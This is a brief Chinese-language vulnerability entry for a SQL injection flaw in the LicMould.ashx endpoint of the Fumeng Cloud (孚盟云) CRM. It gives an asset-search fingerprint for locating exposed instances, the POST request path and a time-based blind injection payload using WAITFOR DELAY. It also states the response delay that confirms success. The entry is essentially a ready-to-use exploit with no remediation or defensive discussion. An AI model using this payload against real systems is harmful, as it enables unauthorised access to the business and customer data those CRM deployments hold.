# 孚盟云CRMLicMould.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app=”孚盟软件-孚盟云”`
- **请求**：`POST /Ajax/LicMould.ashx HTTP/1.1`

**Payload**
```
action=DeleteEmp&key=1%20WAITFOR%20DELAY%20’0:0:5′–&fuids=abc,def,
```
- **响应特征**：200 响应时间>=5s